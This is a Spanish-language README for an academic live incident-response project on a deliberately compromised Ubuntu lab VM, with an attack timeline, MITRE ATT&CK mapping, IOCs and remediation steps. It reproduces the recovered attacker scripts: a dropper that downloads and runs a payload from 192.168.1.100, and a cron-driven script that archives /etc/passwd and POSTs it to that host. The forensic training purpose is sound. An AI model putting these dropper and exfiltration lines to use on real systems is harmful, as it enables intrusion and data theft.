# 🛡️ Live Incident Response — 4geeks-server

> **Proyecto Final de Ciberseguridad · 4Geeks Academy**  
> Investigación forense en vivo sobre un servidor Ubuntu 20.04 comprometido

---

## 📋 Descripción del Proyecto

Este repositorio documenta de forma completa un ejercicio de **Live Incident Response (IR)** realizado sobre el servidor `4geeks-server` (192.168.0.133), una máquina virtual Ubuntu 20.04.6 LTS deliberadamente comprometida para simular un escenario real de respuesta a incidentes en entorno de producción.

La investigación sigue el framework **NIST SP 800-61 Rev. 2** y cubre desde la detección inicial del compromiso hasta la erradicación completa, incluyendo reconstrucción forense de la cadena de ataque, análisis de artefactos, mapeo MITRE ATT&CK y redacción de informes profesionales.

---

## ⚡ Hallazgos Críticos (TL;DR)

| Indicador | Valor |
|---|---|
| **Vector de entrada** | Phishing + credenciales en texto plano (`reports:reports123`) |
| **Dwell time** | ≈ 365 días sin detección (23-jun-2025 → 10-jun-2026) |
| **Escalada de privilegios** | Atribuida a explotación de kernel EOL (5.4.0-216) |
| **Persistencia** | Cron malicioso `/etc/cron.d/sys-maintenance` — cada 15 min |
| **Backdoor** | Cuenta `hacker` (UID 1002) creada, nunca utilizada |
| **Dato exfiltrado** | `/etc/passwd` vía HTTP POST a 192.168.1.100:8080 |
| **Dato NO exfiltrado** | `/etc/shadow` (mencionado en log de cobertura fabricado) |
| **Integridad final** | ✅ Verificada — sin mecanismos de persistencia residuales |

---

## 🗂️ Estructura del Repositorio

```
4geeks-server-incident-response/
│
├── 📄 README.md                          # Este archivo
├── 📄 .gitignore
│
├── 📁 docs/                              # Documentación formal
│   ├── Informe_IR_4geeks-server.docx     # Informe técnico completo (48 pág, 62 evidencias)
│   ├── Guion_Presentacion_Ejecutiva.docx # Guion para audiencia directiva (9 pág)
│   └── Guion_Tecnico_Compromiso.docx     # Guion técnico enfocado en IOCs (10 pág)
│
├── 📁 iocs/                              # Indicadores de Compromiso
│   └── IOCs.md                          # Lista estructurada de IOCs confirmados
│
├── 📁 mitre/                             # Mapeo MITRE ATT&CK
│   └── attack_chain.md                  # Cadena de ataque mapeada al framework
│
└── 📁 evidencia/                         # Capturas de pantalla organizadas por fase
    ├── fase1-reconocimiento/             # Evidencia de la investigación activa
    ├── fase2-remediacion/                # Evidencia de acciones de remediación
    └── verificacion-integridad/          # Evidencia de verificaciones finales
```

---

## 🔬 Entorno del Sistema

```
Host         : 4geeks-server
IP           : 192.168.0.133
OS           : Ubuntu 20.04.6 LTS (Focal Fossa) — EOL
Kernel       : 5.4.0-216-generic (sin parches ESM activos)
Hypervisor   : VirtualBox (confirmado por iprt-VBoxWQueue, vboxguest)
CPU          : Intel Core i3-7100U @ 2.40GHz (2 vCPUs)
RAM          : 4 GB
Disk         : 16.1 GB (sda2, ext4)
```

**Servicios expuestos:**
```
22/tcp   OpenSSH 7.x
80/tcp   Apache/2.4.41 (Ubuntu)
21/tcp   vsftpd (deshabilitado durante remediación)
```

**HIDS:** Wazuh (agente) — wazuh-execd · wazuh-agentd · wazuh-syscheckd · wazuh-logcollector · wazuh-modulesd

---

## ⏱️ Línea de Tiempo del Ataque

```
2025-06-21 19:04 UTC  ┌─ Aprovisionamiento del servidor
                      │  Creación de cuenta sysadmin (UID 1000)
2025-06-21 19:54 UTC  ├─ Creación cuenta "reports" (UID 1001) — from=/dev/tty1
                      │
2025-06-23 13:18 UTC  ├─ Instalación agente Wazuh
                      │
2025-06-23 14:07 UTC  ├─ 🎯 LOGIN de "reports" en consola local (tty1)
                      │  Recepción de phishing → ejecución de install.sh
2025-06-23 14:07 UTC  ├─ 📥 Descarga install.sh desde 192.168.1.100
                      │  wget http://192.168.1.100/install.sh
2025-06-23 ~14:20 UTC ├─ 📥 Descarga y ejecución de payload.bin (stage 2)
                      │  curl -s http://192.168.1.100/payload.bin → LPE
2025-06-23 15:02 UTC  ├─ 👤 Creación cuenta backdoor "hacker" (UID 1002)
                      │  useradd — from=/dev/tty1
2025-06-23 15:02 UTC  ├─ ⏰ Siembra /etc/cron.d/sys-maintenance
                      │  */15 * * * * root /usr/local/bin/backup2.sh
2025-06-23 15:03 UTC  ├─ 🔑 Hash de contraseña establecido para "hacker"
                      │
2025-06-23 en adelante └─ 📤 EXFILTRACIÓN RECURRENTE cada 15 min
                           tar -czf /tmp/secrets.tgz /etc/passwd
                           curl -X POST ... http://192.168.1.100:8080/upload

                              ≈ 365 días de dwell time sin detección

2026-06-10 02:30 UTC  ── 🚨 DETECCIÓN: conexión SYN_SENT visible en netstat
                           tcp 192.168.0.133:60834 → 192.168.1.100:8080
2026-06-18            ── ✅ ERRADICACIÓN completa verificada
```

---

## 🧬 Cadena de Ataque Detallada

### Stage 1 — Dropper (`install.sh`)

```bash
#!/bin/bash
echo "[*] Preparing environment ..."
sleep 1
mkdir -p /tmp/.temp
echo "[*] Downloading dependencies ..."
sleep 2
curl -s http://192.168.1.100/payload.bin -o /tmp/.temp/payload
chmod +x /tmp/.temp/payload
/tmp/.temp/payload &
echo "[*] Installation complete."
```

### Stage 2 — Payload (`/tmp/.temp/payload`)

Binario compilado — ya no presente en disco al inicio de la investigación.  
Acciones confirmadas por forensia de efectos:
- Creó grupo y cuenta `hacker` (UID/GID 1002)
- Modificó shell de `www-data`: `/usr/sbin/nologin` → `/bin/bash`
- Escribió `/etc/cron.d/sys-maintenance`
- Escribió `/usr/local/bin/backup2.sh`
- Escribió `/home/reports/.note` (root:root — post-escalada)
- Estableció contraseña para `hacker` en `/etc/shadow`

### Script de Exfiltración (`/usr/local/bin/backup2.sh`)

```bash
#!/bin/bash
tar -czf /tmp/secrets.tgz /etc/passwd
curl -X POST -F 'file=@/tmp/secrets.tgz' http://192.168.1.100:8080/upload
```

---

## 🗺️ Mapeo MITRE ATT&CK

| Táctica | Técnica | ID | Estado |
|---|---|---|:---:|
| Reconnaissance | Phishing for Information | T1598 | ✅ |
| Initial Access | Phishing | T1566 | ✅ |
| Initial Access | Valid Accounts | T1078 | ✅ |
| Credential Access | Unsecured Credentials: Files | T1552.001 | ✅ |
| Execution | User Execution: Malicious File | T1204.002 | ✅ |
| Execution | Unix Shell | T1059.004 | ✅ |
| Privilege Escalation | Exploitation for Priv. Esc. | T1068 | ⚠️ Atribuido |
| Persistence | Create Account: Local | T1136.001 | ✅ |
| Persistence | Scheduled Task/Job: Cron | T1053.003 | ✅ |
| Persistence / Defense Evasion | Account Manipulation | T1098 | ✅ |
| Defense Evasion | Masquerading | T1036.005 | ✅ |
| Collection | Data from Local System | T1005 | ✅ |
| Command & Control | Application Layer Protocol: Web | T1071.001 | ✅ |
| Exfiltration | Exfiltration Over C2 Channel | T1041 | ✅ |
| Ingress Tool Transfer | Ingress Tool Transfer | T1105 | ✅ |

> ⚠️ T1068 atribuido por eliminación (sin sudo, sin grupos privilegiados, sin SUID añadidos, kernel EOL). CVE específico no identificado — binario de segunda etapa no recuperable.

---

## 🚨 Indicadores de Compromiso (IOCs)

### Red
```
C2 Host    : 192.168.1.100
C2 Port    : 8080/tcp
Endpoints  : /install.sh · /payload.bin · /upload (POST)
Protocol   : HTTP (no cifrado)
```

### Filesystem
```
/opt/.archive/credentials.txt          → credenciales en texto plano
/home/reports/chat.txt                 → evidencia de phishing
/home/reports/install.sh               → dropper stage 1 (preservado)
/home/reports/backup.log               → log de cobertura fabricado
/home/reports/.note                    → referencia a credenciales (root:root)
/etc/cron.d/sys-maintenance            → cron malicioso (ELIMINADO)
/usr/local/bin/backup2.sh              → script de exfiltración (ELIMINADO)
/tmp/secrets.tgz                       → archivo exfiltrado (ELIMINADO)
/tmp/.temp/payload                     → binario LPE stage 2 (no recuperable)
```

### Cuentas
```
reports   UID=1001  /bin/bash  → vector de acceso inicial (ELIMINADA)
hacker    UID=1002  /bin/bash  → backdoor nunca usada     (ELIMINADA)
www-data             shell modificada a /bin/bash          (CORREGIDA)
```

---

## 🛠️ Acciones de Remediación Aplicadas

| # | Acción | Comando | Estado |
|---|---|---|:---:|
| 1 | Eliminar cron malicioso | `rm -f /etc/cron.d/sys-maintenance` | ✅ |
| 2 | Eliminar script de exfiltración | `rm -f /usr/local/bin/backup2.sh` | ✅ |
| 3 | Eliminar archivo exfiltrado | `rm -f /tmp/secrets.tgz` | ✅ |
| 4 | Corregir shell www-data | `usermod -s /usr/sbin/nologin www-data` | ✅ |
| 5 | Preservar evidencia forense | `tar -czpf + sha256sum` | ✅ |
| 6 | Eliminar cuenta reports | `userdel -r reports` | ✅ |
| 7 | Eliminar cuenta hacker | `userdel -r hacker` | ✅ |
| 8 | Destruir credentials.txt | `shred -u /opt/.archive/credentials.txt` | ✅ |
| 9 | Deshabilitar vsftpd | `systemctl stop vsftpd && systemctl disable vsftpd` | ✅ |

---

## ✅ Verificaciones de Integridad (Post-Remediación)

| Área | Resultado |
|---|:---:|
| Cuentas UID 0 adicionales | ✅ Ninguna |
| Contraseñas vacías en /etc/shadow | ✅ Ninguna |
| authorized_keys no autorizados | ✅ Ninguno |
| Binarios con SUID añadido | ✅ Solo estándar de fábrica |
| Módulos de kernel sospechosos (lsmod) | ✅ Todos legítimos |
| `/etc/ld.so.preload` | ✅ Vacío |
| Integridad de paquetes (dpkg -V) | ✅ Sin modificaciones |
| Timers de systemd | ✅ Solo estándar Ubuntu |
| Tareas `at` pendientes | ✅ Cola vacía |
| Reglas de firewall modificadas (iptables / nftables) | ✅ Sin cambios |
| Conexiones activas hacia el C2 | ✅ Ninguna al cierre |
| Segunda exfiltración de /etc/shadow | ✅ Descartada — fabricada |

---

## 📂 Documentación

| Documento | Descripción | Páginas |
|---|---|:---:|
| [`Informe_IR_4geeks-server.docx`](docs/Informe_IR_4geeks-server.docx) | Informe técnico completo con 62 capturas de evidencia | 48 |
| [`Guion_Presentacion_Ejecutiva.docx`](docs/Guion_Presentacion_Ejecutiva.docx) | Guion para presentación a audiencia directiva (sin tecnicismos) | 9 |
| [`Guion_Tecnico_Compromiso.docx`](docs/Guion_Tecnico_Compromiso.docx) | Guion técnico enfocado en IOCs y cadena de ataque confirmada | 10 |
| [`iocs/IOCs.md`](iocs/IOCs.md) | Listado estructurado de todos los IOCs del incidente | — |
| [`mitre/attack_chain.md`](mitre/attack_chain.md) | Análisis detallado de cada técnica MITRE con evidencia | — |

---

## 🔧 Metodología

```
NIST SP 800-61 Rev. 2 — Computer Security Incident Handling Guide
│
├── Preparation         → Acceso SSH legítimo, herramientas de análisis
├── Detection           → netstat · ps auxf · syslog · auth.log
├── Analysis            → Reconstrucción forense de cadena de ataque
├── Containment         → Eliminación de persistencia activa (sin shutdown)
├── Eradication         → Eliminación de cuentas, scripts, credenciales
├── Recovery            → Verificación de integridad exhaustiva
└── Lessons Learned     → Recomendaciones de fortalecimiento
```

**Restricción operativa:** Live Incident Response sin posibilidad de apagado ni imagen forense de disco. Toda la investigación se realizó sobre el sistema en ejecución.

---

## 📌 Limitaciones Conocidas

- El binario `payload` (stage 2) no estaba presente al iniciar la investigación — el CVE exacto de la escalada de privilegios no fue identificado.
- Los logs históricos de Apache (access.log) están en 0 bytes desde la provisión del servidor — no hay telemetría web del periodo del incidente.
- Las alertas históricas de Wazuh residen en el manager externo, no accesible desde este host — el análisis SIEM queda fuera del alcance de esta investigación.

---

## 📚 Referencias

- [NIST SP 800-61 Rev. 2](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf)
- [MITRE ATT&CK for Enterprise](https://attack.mitre.org/)
- [Ubuntu Security Notices — Kernel 5.4](https://ubuntu.com/security/notices)
- [Wazuh HIDS Documentation](https://documentation.wazuh.com/)
- [UFW / iptables reference](https://help.ubuntu.com/community/UFW)

---

## ⚠️ Disclaimer

> Este repositorio es el resultado de un ejercicio académico controlado realizado sobre una máquina virtual provista específicamente para este propósito por **4Geeks Academy**. Toda la actividad documentada ocurrió en un entorno de laboratorio aislado. Ninguna técnica o herramienta documentada aquí debe aplicarse sobre sistemas sin autorización explícita por escrito del propietario.

---

*Proyecto Final — Ciberseguridad · 4Geeks Academy · Junio 2026*
